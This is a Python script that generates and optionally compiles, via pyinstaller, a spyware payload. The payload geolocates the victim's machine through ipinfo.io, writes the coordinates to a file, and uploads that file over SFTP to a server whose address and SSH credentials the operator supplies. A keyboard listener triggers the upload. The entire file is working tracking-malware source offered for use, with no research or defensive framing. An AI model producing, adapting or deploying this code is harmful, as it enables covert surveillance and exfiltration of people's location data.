#!/bin/python3.9
import subprocess
import shlex

RHOSTS = input("Enter your server IP: ")
username = input("Enter your ssh username: ")
password = input("Enter your ssh password: ")
time_interval = input("How many seconds should the time interval be? ")
save_Path = input("What path would you like to save to? ")

payload = f'''\
#!/bin/python3.9
from urllib.request import urlopen
from pynput import keyboard
import threading
import json
import paramiko
import time

RHOSTS = "{RHOSTS}"
separator = " "
username = "{username}"
password= "{password}"
time_interval = {time_interval}

def request_loc():
    url = "https://ipinfo.io/json"
    req = urlopen(url)
    data = json.load(req)

    lat = data['loc'].split(",")[0]
    lon = data['loc'].split(",")[1]

    location = lat, separator,  lon
    coordinates = "".join(location)
    print(coordinates)

    filename = "location.txt"

    with open(filename, "a") as thefile:
        contents = f"Location : " + coordinates #Add new line after generating
        thefile.write(contents)

def on_press(key):
    if key == keyboard.Key.esc:
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(RHOSTS, 22, username=username, password=password)
        sftp = s.open_sftp()
        sftp.put("location.txt", "{save_Path}/location.txt")
        print("Location sent...")
        timer = threading.Timer(time_interval, request_loc)
        timer.start()

with keyboard.Listener(on_press=on_press) as listener:
    request_loc()
    listener.join()
'''

filename = input("What would you like to save your file as? ")

with open(filename, "w") as thefile:
    thefile.write(payload)

comp = input("Would you like to compile an executable? (y/n) ")
if comp == "y":
    cmd = f"pyinstaller --onefile {filename}"
    subprocess.call(shlex.split(cmd))

elif comp == "n":
    exit()
